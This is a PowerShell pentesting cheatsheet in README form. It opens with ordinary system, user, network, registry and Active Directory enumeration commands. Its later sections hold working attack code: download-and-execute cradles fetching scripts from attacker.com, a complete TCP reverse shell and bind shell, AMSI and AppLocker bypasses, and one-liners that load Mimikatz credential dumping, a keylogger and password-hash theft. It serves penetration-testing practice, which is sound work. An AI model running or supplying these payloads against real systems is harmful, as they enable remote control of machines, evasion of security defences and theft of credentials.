# 💻 PowerShell - Complete Pentesting Cheatsheet

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

## 📋 Table of Contents

- [Basics](#-basics)
- [System Enumeration](#-system-enumeration)
- [User Enumeration](#-user-enumeration)
- [Network Commands](#-network-commands)
- [File Operations](#-file-operations)
- [Process & Service Management](#-process--service-management)
- [Registry Operations](#-registry-operations)
- [Active Directory](#-active-directory)
- [Download & Execution](#-download--execution)
- [Reverse Shells](#-reverse-shells)
- [Bypass Techniques](#-bypass-techniques)
- [Offensive Tools](#-offensive-tools)
- [One-Liners](#-one-liners)

---

## 🔰 Basics

### Execution Policy

```powershell
# Check current policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Bypass execution policy (current session)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Run script bypassing policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Getting Help

```powershell
# Get help for command
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Update help
Update-Help

# List all commands
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variables & Operators

```powershell
# Variables
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Environment variables
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Comparison operators
-eq   # Equal
-ne   # Not equal
-gt   # Greater than
-lt   # Less than
-like # Wildcard match
-match # Regex match
```

### Piping & Filtering

```powershell
# Pipe output
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Select properties
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Sort
Get-Process | Sort-Object CPU -Descending

# Format output
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

## 🔍 System Enumeration

### System Information

```powershell
# Computer info
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# OS version
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Architecture
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Hotfixes/Patches
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Installed Software

```powershell
# 64-bit software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 32-bit software on 64-bit OS
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Using WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Quick list
Get-Package
```

### Antivirus & Security

```powershell
# Get antivirus
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Firewall status
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Firewall rules
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Windows Defender exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Scheduled Tasks

```powershell
# List scheduled tasks
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Task details
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

## 👤 User Enumeration

### Local Users

```powershell
# Current user
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# All local users
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# User details
Get-LocalUser Administrator
net user Administrator

# User groups
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### User Privileges

```powershell
# Current privileges
whoami /priv
whoami /all
whoami /groups

# Check if admin
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Groups

```powershell
# List local groups
Get-LocalGroup
net localgroup

# Group members
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Logged In Users

```powershell
# Currently logged in
query user
quser
qwinsta

# Recent logins
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

## 🌐 Network Commands

### Network Configuration

```powershell
# IP configuration
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Routes
Get-NetRoute
route print

# ARP table
Get-NetNeighbor
arp -a
```

### Open Ports & Connections

```powershell
# TCP connections
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# UDP connections
Get-NetUDPEndpoint

# Find process by port
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Network Testing

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Port check
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Trace route
Test-NetConnection -ComputerName google.com -TraceRoute

# DNS lookup
Resolve-DnsName google.com
nslookup google.com
```

### Network Shares

```powershell
# List shares
Get-SmbShare
net share

# Map network drive
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# List connected shares
Get-SmbConnection
net use

# Access share
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

## 📁 File Operations

### Navigation & Listing

```powershell
# Current directory
Get-Location
pwd

# Change directory
Set-Location C:\Users
cd C:\Users

# List files
Get-ChildItem
Get-ChildItem -Force  # Include hidden
Get-ChildItem -Recurse
ls
dir

# List hidden files
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### File Search

```powershell
# Find files by name
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Find files containing text
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Find large files
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Find recently modified
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Read & Write Files

```powershell
# Read file
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Write to file
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Append

# Copy/Move/Delete
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Alternate Data Streams (ADS)

```powershell
# List ADS
Get-Item file.txt -Stream *
dir /r file.txt

# Read ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# Write to ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Remove ADS
Remove-Item file.txt -Stream hidden
```

### Hashing

```powershell
# Get file hash
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Verify hash
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

## ⚙️ Process & Service Management

### Processes

```powershell
# List processes
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Process details
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Start process
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # As admin

# Stop process
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Services

```powershell
# List services
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Service details
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Start/Stop services
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Service path (for unquoted path check)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

## 📝 Registry Operations

### Reading Registry

```powershell
# List registry keys
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Get registry value
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Search registry
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Writing Registry

```powershell
# Create key
New-Item -Path HKCU:\SOFTWARE\MyKey

# Set value
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Delete
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Important Registry Locations

```powershell
# Autorun locations
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Uninstall (installed software)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (requires SYSTEM)
# HKLM:\SAM\SAM

# LSA secrets
# HKLM:\SECURITY\Policy\Secrets
```

---

## 🏢 Active Directory

### Domain Information

```powershell
# Domain info
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Domain controllers
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Forest info
Get-ADForest

# Trust relationships
Get-ADTrust -Filter *
```

### User Enumeration (AD)

```powershell
# All domain users
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Specific user
Get-ADUser -Identity administrator -Properties *

# Users with specific property
Get-ADUser -Filter {AdminCount -eq 1}  # Admins
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Kerberoastable

# Search users
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Group Enumeration (AD)

```powershell
# All groups
Get-ADGroup -Filter *

# Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# User's groups
Get-ADPrincipalGroupMembership username
```

### Computer Enumeration (AD)

```powershell
# All computers
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Domain Controllers
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Servers
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### GPO Information

```powershell
# List GPOs
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# GPO details
Get-GPO -Name "Default Domain Policy"

# GPO report
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

## ⬇️ Download & Execution

### Download Files

```powershell
# Invoke-WebRequest (wget/curl equivalent)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (faster)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Download string (for scripts)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# BITS Transfer (stealthier)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Download & Execute (In Memory)

```powershell
# IEX - Invoke-Expression (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# With variable
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Encoded Execution

```powershell
# Base64 encode command
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Execute encoded
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# One-liner encoder
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

## 🔌 Reverse Shells

### PowerShell Reverse Shell

```powershell
# TCP Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### One-Liner Reverse Shell

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shell

```powershell
# Bind to port
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

## 🛡️ Bypass Techniques

### Execution Policy Bypass

```powershell
# Bypass methods
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Read and pipe
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Download string (no file on disk)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### AMSI Bypass

```powershell
# Simple AMSI bypass (may be detected)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Memory patching (requires admin)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (full bypass code)
```

### Constrained Language Mode Bypass

```powershell
# Check language mode
$ExecutionContext.SessionState.LanguageMode

# If ConstrainedLanguage, try:
# - PowerShell 2.0 (if available)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### AppLocker Bypass

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Check AppLocker rules
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## 🔫 Offensive Tools

### PowerSploit

```powershell
# Download
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (AD enumeration)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (PrivEsc)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Stager execution (from Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Reverse shell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Keylogger
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

## ⚡ One-Liners

### Enumeration One-Liners

```powershell
# System info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Users
Get-LocalUser | Select Name,Enabled

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Open ports
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Running services
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Scheduled tasks
schtasks /query /fo TABLE | findstr /v "TaskName"

# AV status
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Firewall
Get-NetFirewallProfile | Select Name,Enabled
```

### Download One-Liners

```powershell
# PowerShell download
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Command Table

| Purpose | Command |
|---------|---------|
| Current user | `whoami` |
| All users | `Get-LocalUser` |
| Admins | `Get-LocalGroupMember Administrators` |
| System info | `systeminfo` |
| IP config | `Get-NetIPAddress` |
| Open ports | `Get-NetTCPConnection -State Listen` |
| Processes | `Get-Process` |
| Services | `Get-Service \| Where Status -eq Running` |
| Find files | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Search content | `Select-String -Path "C:\*" -Pattern "password"` |
| Download file | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Encoded exec | `powershell -enc <base64>` |

---

## 📚 Resources

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Related Cheatsheets
- [Mimikatz](../Mimikatz/README.md)
- [Windows PrivEsc](../Windows-PrivEsc/README.md)
- [Metasploit](../Metasploit/README.md)

---

<p align="center">
  <b>💻 Master PowerShell for Pentesting!</b><br>
  <i>The most powerful Windows scripting language</i>
</p>
